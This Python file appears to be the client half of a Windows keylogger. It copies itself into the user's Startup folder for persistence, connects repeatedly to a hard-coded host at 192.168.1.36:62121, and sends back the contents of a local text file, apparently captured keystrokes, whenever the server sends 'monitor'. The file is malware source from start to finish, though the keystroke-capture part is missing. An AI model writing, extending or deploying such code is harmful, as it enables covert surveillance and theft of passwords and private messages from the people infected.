import socket
import os
import shutil
from pynput import keyboard

file_location = os.getcwd()
user = os.getlogin()
file_is_open = False
text_file_name = file_location + "\textfile.txt"
des = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe"
path = str(file_location) + "\client.exe"

try:
    if os.path.exists(des):
        print("File exists")
    else:
        shutil.copy(path, des)
except:
    print("[FAILED] File could not find...")

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("192.168.1.36", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        try:
            data = (s.recv(1024)).decode("utf-8")
            if data == "monitor":
                with open("textfile.txt", "r") as read_file:
                    file_data = read_file.read()
                    s.sendall(file_data.encode("utf-8"))
        except:
            break
